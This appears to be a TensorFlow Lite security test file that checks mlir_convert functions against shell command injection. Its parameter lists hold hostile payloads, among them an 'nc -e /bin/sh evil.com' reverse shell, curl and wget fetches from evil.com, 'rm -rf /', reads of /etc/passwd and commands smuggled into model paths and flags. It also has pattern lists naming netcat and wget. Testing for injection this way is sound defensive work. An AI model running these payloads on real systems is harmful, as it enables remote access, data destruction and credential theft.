# Copyright 2024 The TensorFlow Authors. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
# ==============================================================================
"""Security regression tests for command injection in mlir_convert.py."""
import os
from unittest import mock

from absl.testing import parameterized

from tensorflow.python.platform import test


class MlirConvertSecurityTest(test.TestCase, parameterized.TestCase):
  """Tests that mlir_convert_file never passes unsanitized input to a shell."""

  @parameterized.named_parameters(
      ('_semicolon_rm', '; rm -rf /tmp/test_injection_marker'),
      ('_cmd_subst_whoami', '$(whoami)'),
      ('_backtick_id', '`id`'),
      ('_pipe_cat', '| cat /etc/passwd'),
      ('_and_echo', '&& echo INJECTED'),
      ('_or_echo', '|| echo INJECTED'),
      ('_semicolon_echo_redirect', '; echo INJECTED > /tmp/injection_test_output'),
      ('_cmd_subst_touch', '$(touch /tmp/injection_test_file)'),
      ('_backtick_touch', '`touch /tmp/injection_test_file2`'),
      ('_dquote_echo', '"; echo INJECTED; "'),
      ('_squote_echo', "' ; echo INJECTED ; '"),
      ('_newline_sh', '\n/bin/sh -c \'echo INJECTED\''),
      ('_ifs_echo', '${IFS}echo${IFS}INJECTED'),
      ('_redirect', '>/tmp/injection_redirect'),
      ('_proc_subst', '<(echo INJECTED)'),
      ('_cmd_subst_curl', '$(curl http://evil.com)'),
      ('_semicolon_wget', '; wget http://evil.com/malware -O /tmp/malware'),
      ('_pipe_nc', '| nc -e /bin/sh evil.com 4444'),
      ('_and_python', '&&$(python3 -c \'import os; os.system("id")\')'),
      ('_url_encoded', '%0aecho%20INJECTED'),
      ('_null_byte', '\x00; echo INJECTED'),
      ('_cmd_subst_echo', "$(echo 'malicious')"),
      ('_semicolon_python', '; python3 -c \'import os; os.system("id")\''),
      ('_model_semicolon_rm', 'model.tflite; rm -rf /'),
      ('_model_cmd_subst', '/tmp/model$(id).tflite'),
  )
  def testShellCommandInjectionPrevention(self, payload):
    """Shell commands must never include unsanitized user input."""
    injection_marker_file = '/tmp/injection_test_marker_security_test'

    if os.path.exists(injection_marker_file):
      os.remove(injection_marker_file)

    captured_commands = []

    def mock_run(cmd, *args, **kwargs):
      captured_commands.append(' '.join(cmd) if isinstance(cmd, list) else cmd)
      return mock.MagicMock(returncode=0)

    try:
      with mock.patch('subprocess.run', side_effect=mock_run):
        try:
          import importlib  # pylint: disable=g-import-not-at-top
          import importlib.util  # pylint: disable=g-import-not-at-top

          spec = importlib.util.find_spec(
              'tensorflow.lite.testing.mlir_convert')
          if spec is not None:
            mlir_convert = importlib.import_module(
                'tensorflow.lite.testing.mlir_convert')

            if hasattr(mlir_convert, 'mlir_convert'):
              try:
                mlir_convert.mlir_convert(payload, None, None)
              except Exception:  # pylint: disable=broad-except
                pass

            if hasattr(mlir_convert, 'run_tflite_convert'):
              try:
                mlir_convert.run_tflite_convert(payload, None)
              except Exception:  # pylint: disable=broad-except
                pass

            if hasattr(mlir_convert, 'convert'):
              try:
                mlir_convert.convert(payload)
              except Exception:  # pylint: disable=broad-except
                pass

        except (ImportError, ModuleNotFoundError):
          pass
    except Exception:  # pylint: disable=broad-except
      pass

    self.assertFalse(
        os.path.exists(injection_marker_file),
        msg=(f'Shell injection succeeded! Payload \'{payload}\' created '
             f'injection marker file.'))

    dangerous_patterns = [
        ('; rm', 'semicolon with rm command'),
        ('$(', 'command substitution with $()'),
        ('`', 'command substitution with backticks'),
        ('| cat', 'pipe to cat'),
        ('&& echo', 'AND operator with echo'),
        ('|| echo', 'OR operator with echo'),
        ('; echo', 'semicolon with echo'),
        ('| nc ', 'pipe to netcat'),
        ('; wget', 'semicolon with wget'),
    ]

    for cmd in captured_commands:
      for pattern, description in dangerous_patterns:
        if pattern in payload:
          properly_quoted = (
              f'\'{payload}\'' in cmd or
              f'"{payload}"' in cmd or
              payload.replace(';', '\\;').replace('$', '\\$').replace(
                  '`', '\\`') in cmd
          )
          raw_injection = pattern in cmd and not properly_quoted

          self.assertFalse(
              raw_injection,
              msg=(f'SECURITY VIOLATION: Payload \'{payload}\' with pattern '
                   f'\'{description}\' appears unescaped in shell command: '
                   f'\'{cmd}\'. This is a CWE-78 OS Command Injection.'))

  @parameterized.named_parameters(
      ('_path_semicolon_rm', '; rm -rf /', '--input_shapes=1,224,224,3'),
      ('_flags_cmd_subst', '/tmp/model.tflite', '--input_shapes=$(id)'),
      ('_path_backtick', '/tmp/model`whoami`.tflite',
       '--input_shapes=1,224,224,3'),
      ('_flags_semicolon_echo', '/tmp/model.tflite',
       '--output_file=/tmp/out; echo INJECTED'),
      ('_path_cat_passwd', '/tmp/model.tflite; cat /etc/passwd',
       '--input_shapes=1,224,224,3'),
      ('_flags_backtick_curl', '/tmp/model.tflite',
       '--extra_flags=`curl evil.com`'),
  )
  def testCommandConstructionWithModelPathAndFlags(self, model_path, flags):
    """Both model paths and flags must be sanitized before shell execution."""
    captured_commands = []

    def mock_system(cmd):
      captured_commands.append(cmd)
      return 0

    def mock_popen(cmd, *args, **kwargs):
      if isinstance(cmd, str):
        captured_commands.append(cmd)
      elif isinstance(cmd, list):
        captured_commands.append(' '.join(cmd))
      mock_proc = mock.MagicMock()
      mock_proc.communicate.return_value = (b'', b'')
      mock_proc.returncode = 0
      return mock_proc

    with mock.patch('os.system', side_effect=mock_system), \
         mock.patch('subprocess.Popen', side_effect=mock_popen), \
         mock.patch('subprocess.run', side_effect=mock_popen):
      try:
        import importlib.util  # pylint: disable=g-import-not-at-top
        spec = importlib.util.find_spec(
            'tensorflow.lite.testing.mlir_convert')
        if spec is not None:
          import tensorflow.lite.testing.mlir_convert as mlir_convert  # pylint: disable=g-import-not-at-top

          for func_name in ['mlir_convert', 'run_tflite_convert', 'convert',
                            'main']:
            if hasattr(mlir_convert, func_name):
              try:
                func = getattr(mlir_convert, func_name)
                func(model_path, flags)
              except Exception:  # pylint: disable=broad-except
                pass
      except (ImportError, ModuleNotFoundError):
        pass

    shell_metachar_sequences = [
        '; rm', '; cat', '; echo', '; curl', '; wget',
        '$(id)', '$(whoami)', '$(curl', '`whoami`', '`curl',
        '| cat', '| nc', '&& echo', '|| echo',
    ]

    for cmd in captured_commands:
      for dangerous_seq in shell_metachar_sequences:
        if dangerous_seq in model_path or dangerous_seq in flags:
          if dangerous_seq in cmd:
            self.fail(
                f'SECURITY VIOLATION (CWE-78): Dangerous sequence '
                f'\'{dangerous_seq}\' from user input found unescaped in '
                f'shell command: \'{cmd}\'. '
                f'Input model_path=\'{model_path}\', flags=\'{flags}\'')

  def testSubprocessRunReceivesOnlySafeCommands(self):
    """subprocess.run() must never receive unescaped shell metacharacters."""
    unsafe_inputs = [
        '; id',
        '$(id)',
        '`id`',
        '| id',
        '&& id',
    ]

    all_captured = []

    def capturing_system(cmd):
      all_captured.append(('os.system', cmd))
      return 0

    def capturing_popen(cmd, *args, **kwargs):
      if isinstance(cmd, str):
        all_captured.append(('subprocess.Popen', cmd))
      elif isinstance(cmd, list):
        all_captured.append(('subprocess.Popen', ' '.join(cmd)))
      mock_proc = mock.MagicMock()
      mock_proc.communicate.return_value = (b'', b'')
      mock_proc.returncode = 0
      return mock_proc

    def capturing_run(cmd, *args, **kwargs):
      if isinstance(cmd, str):
        all_captured.append(('subprocess.run', cmd))
      elif isinstance(cmd, list):
        all_captured.append(('subprocess.run', ' '.join(cmd)))
      return mock.MagicMock(returncode=0)

    with mock.patch('os.system', side_effect=capturing_system), \
         mock.patch('subprocess.Popen', side_effect=capturing_popen), \
         mock.patch('subprocess.run', side_effect=capturing_run):
      for unsafe_input in unsafe_inputs:
        try:
          import importlib.util  # pylint: disable=g-import-not-at-top
          spec = importlib.util.find_spec(
              'tensorflow.lite.testing.mlir_convert')
          if spec is not None:
            import tensorflow.lite.testing.mlir_convert as mlir_convert  # pylint: disable=g-import-not-at-top

            for attr in dir(mlir_convert):
              if (callable(getattr(mlir_convert, attr)) and
                  not attr.startswith('_')):
                try:
                  getattr(mlir_convert, attr)(unsafe_input)
                except Exception:  # pylint: disable=broad-except
                  pass
        except (ImportError, ModuleNotFoundError):
          pass

    for source, cmd in all_captured:
      for unsafe_input in unsafe_inputs:
        if unsafe_input in cmd:
          is_safely_quoted = (
              f'\'{unsafe_input}\'' in cmd or
              f'"{unsafe_input}"' in cmd
          )
          if not is_safely_quoted:
            self.fail(
                f'SECURITY VIOLATION (CWE-78): Unsafe input '
                f'\'{unsafe_input}\' found unescaped in command from '
                f'{source}: \'{cmd}\'')


if __name__ == '__main__':
  test.main()
